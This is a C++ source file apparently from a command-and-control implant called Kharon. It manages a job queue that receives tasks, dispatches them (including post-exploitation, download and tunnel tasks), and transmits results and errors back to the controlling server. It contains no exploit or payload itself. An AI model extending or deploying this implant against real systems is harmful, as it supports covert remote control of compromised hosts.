#include <Kharon.h>

auto DECLFN Jobs::Create(
    _In_ CHAR*   TaskId, 
    _In_ PARSER* Parser,
    _In_ BOOL    IsResponse
) -> JOBS* {
    JOBS*   NewJob = (JOBS*)KhAlloc( sizeof( JOBS ) );
    PARSER* JobPsr = (PARSER*)KhAlloc( sizeof( PARSER ) );

    if ( ! NewJob || ! JobPsr ) {
        if ( NewJob ) KhFree( NewJob );
        if ( JobPsr ) KhFree( JobPsr );
        return nullptr;
    }

    ULONG Length = 0;
    PVOID Data   = nullptr;
    
    if ( IsResponse ) {
        Self->Psr->Pad( Parser, Length );
        Length = Parser->Length;
        Data   = Parser->Buffer;
        NewJob->Destroy = Parser;
    } else {
        Length = 0;
        Data   = Self->Psr->Bytes( Parser, &Length );
    }

    KhDbg( "data at %p [%d bytes] to parse", Data, Length );
    
    Self->Psr->New( JobPsr, Data, Length );

    ULONG cmdID = Self->Psr->Int16( JobPsr );

    NewJob->Id = (CHAR*)KhAlloc( Str::LengthA(TaskId) + 1 );
    Mem::Copy( NewJob->Id, TaskId, Str::LengthA(TaskId) + 1 );

    NewJob->CmdID    = cmdID;
    NewJob->ExitCode = -1;
    NewJob->State    = KH_JOB_PRE_START;
    NewJob->Psr      = JobPsr;
    NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, TaskId );
    NewJob->Clean    = TRUE;
    NewJob->PersistTriggered = FALSE;   

    if ( ! NewJob->Pkg ) {
        KhFree( NewJob );
        KhFree( JobPsr );
        return nullptr;
    }

    KhDbg( "adding job with id: %s and command id: %d", NewJob->Id, NewJob->CmdID );

    if ( !this->List ) {
        this->List = NewJob;
    } else {
        JOBS* Current = this->List;
        while ( Current->Next ) {
            Current = Current->Next;
        }
        Current->Next = NewJob;
    }
    
    Count++;

    KhDbg( "total jobs: %d", Count );

    return NewJob;
}

auto DECLFN Jobs::Send(
    _In_ PACKAGE* PostJobs
) -> VOID {
    JOBS* Current = List;

    while ( Current ) {
        if ( 
            Current->State    == KH_JOB_READY_SEND &&
            Current->ExitCode == EXIT_SUCCESS
        ) {
            Self->Pkg->Byte( PostJobs, 1 );
            Self->Pkg->Pad( PostJobs, UC_PTR( Current->Id ), 8 );
            Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
            Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
        } else if ( 
            Current->State    == KH_JOB_READY_SEND && 
            Current->ExitCode != EXIT_SUCCESS      &&
            Current->ExitCode != -1
        ) {
            PCHAR Unknown  = "unknown error";
            PCHAR ErrorMsg = nullptr;
            ULONG Flags    = FORMAT_MESSAGE_ALLOCATE_BUFFER | 
                             FORMAT_MESSAGE_FROM_SYSTEM     | 
                             FORMAT_MESSAGE_IGNORE_INSERTS;
            
            ULONG MsgLen = Self->Krnl32.FormatMessageA(
                Flags, NULL, Current->ExitCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
                (LPSTR)&ErrorMsg, 0, NULL
            );

            MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );

            Self->Pkg->Pad( PostJobs, UC_PTR( Current->Id ), 8 );
            Self->Pkg->Int32( PostJobs, MsgLen + 2 + 40 + sizeof(INT16) + sizeof(INT32) );

            Self->Pkg->Int16( PostJobs, (INT16)Action::Task::Error );
            Self->Pkg->Int32( PostJobs, Current->ExitCode );

            if ( MsgLen > 0 && ErrorMsg ) {
                Self->Pkg->Str( PostJobs, ErrorMsg );
                Self->Krnl32.LocalFree( ErrorMsg );
            } else {
                Self->Pkg->Str( PostJobs, Unknown );
            }
        }
        
        Current = Current->Next;
    }
    
    BOOL Sent = Self->Pkg->Transmit( PostJobs, (PVOID*)0, 0 );

    if ( Sent ) {
        Current = List;
        while ( Current ) {
            if ( Current->State == KH_JOB_READY_SEND ) {
                if ( Current->Clean ) {
                    Current->State = KH_JOB_TERMINATE;
                } else {
                    Current->State = KH_JOB_RUNNING;
                    Self->Pkg->Destroy( Current->Pkg );
                    Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->Id );

                    if ( Current->CmdID == (ULONG)Action::Task::PostEx ) {
                        Self->Pkg->Int32( Current->Pkg, (ULONG)Action::Postex::Poll );
                    }
                }
            }
            Current = Current->Next;
        }
    }
}

auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
    JOBS* Current  = this->List;
    JOBS* Previous = nullptr;

    while ( Current ) {
        if ( Current->State == KH_JOB_TERMINATE ) {
            KhDbg("Cleaning up job: %s", Current->Id);
            JOBS* ToRemove = Current;
             
            if ( Previous ) {
                Previous->Next = Current->Next;
                Current        = Current->Next;
            } else {
                this->List = Current->Next;
                Current    = this->List;
            }

            if ( ToRemove->Pkg ) {
                KhDbg("Destroying Package for job %s", ToRemove->Id);
                Self->Pkg->Destroy( ToRemove->Pkg );
                ToRemove->Pkg = nullptr;
            }

            if ( ToRemove->Psr ) {
                KhDbg("Destroying Parser for job %s", ToRemove->Id);
                Self->Psr->Destroy( ToRemove->Psr ); 
                if ( Self->Hp->CheckPtr( ToRemove->Psr ) ) {
                    KhDbg("Freeing Parser struct for job %s", ToRemove->Id);
                    KhFree( ToRemove->Psr );
                }
                ToRemove->Psr = nullptr;
            }

            if ( ToRemove->Destroy ) {
                KhDbg("Destroying original Parser (Destroy) for job %s", ToRemove->Id);
                Self->Psr->Destroy( (PARSER*)ToRemove->Destroy );
                if ( Self->Hp->CheckPtr( ToRemove->Destroy ) ) {
                    KhDbg("Freeing original Parser struct (Destroy) for job %s", ToRemove->Id);
                    KhFree( ToRemove->Destroy );
                }
                ToRemove->Destroy = nullptr;
            }

            if ( ToRemove->Id ) {
                if ( Self->Hp->CheckPtr( ToRemove->Id ) ) {
                    KhFree( ToRemove->Id );
                }
            }

            if ( Self->Hp->CheckPtr( ToRemove ) ) {
                KhDbg("Freeing JOBS struct for job %s", ToRemove->Id);
                KhFree( ToRemove );
            }
            
            Count--;
        } else {
            Previous = Current;
            Current  = Current->Next;
        }
    }
}

auto DECLFN Jobs::ExecuteAll( VOID ) -> LONG {
    JOBS* Current = this->List;
    LONG  FlagRet = 0;

    while ( Current ) {
        if ( Current->State == KH_JOB_PRE_START || Current->State == KH_JOB_RUNNING ) {
            if( ! Current->PersistTriggered && ((Action::Task)Current->CmdID == Action::Task::ProcessDownloads || (Action::Task)Current->CmdID == Action::Task::ProcessTunnels ) ){
                KhDbg("Persist Triggered for job: %s", Current->Id);
                Current->PersistTriggered = TRUE;
                Current = Current->Next;
                continue;
            }
            
            KhDbg( "executing task UUID : %s", Current->Id );
            KhDbg( "executing command id: %d", Current->CmdID );

            FlagRet = 1;

            Self->Pkg->Shared = Current->Pkg;
            Self->Psr->Shared = Current->Psr;

            this->CurrentId    = Current->Id;
            this->CurrentCmdId = Current->CmdID;
            Current->State     = KH_JOB_RUNNING;
            ERROR_CODE Result  = Self->Jbs->Execute( Current );
            Current->ExitCode  = Result;
            Current->State     = KH_JOB_READY_SEND;

            KhDbg( "job executed with exit code: %d, should clean: %d", Current->ExitCode, Current->Clean );
        }

        Current = Current->Next;
    }

    return FlagRet;
}

auto DECLFN Jobs::Execute(
    _In_ JOBS* Job
) -> ERROR_CODE {
    G_KHARON

    for ( INT i = 0; i < TSK_LENGTH; i++ ) {
        if ( (Action::Task)Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
            return ( Self->Tsk->*Self->Tsk->Mgmt[i].Run )( Job );
        }
    }

    // KH_ERROR_INVALID_TASK_ID
    return -2;
}

auto DECLFN Jobs::GetById(
    _In_ CHAR* Id
) -> JOBS* {
    JOBS* Current = this->List;
    while ( Current ) {
        if ( Mem::Cmp( (PBYTE)Current->Id, (PBYTE)Id, 8 ) ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::GetByCmdId(
    _In_ ULONG Id
) -> JOBS* {
    JOBS* Current = this->List;
    while ( Current ) {
        if ( Current->CmdID == Id ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::Remove(
    _In_ JOBS* Job
) -> BOOL {
    if ( !this->List ) return FALSE;
    
    if ( this->List == Job ) {
        this->List = Job->Next;
    } else {
        JOBS* Current = this->List;
        while ( Current->Next && Current->Next != Job ) {
            Current = Current->Next;
        }
        
        if ( Current->Next == Job ) {
            Current->Next = Job->Next;
        } else {
            return FALSE;
        }
    }
    
    KhFree( Job );
    this->Count--;

    return TRUE;
}
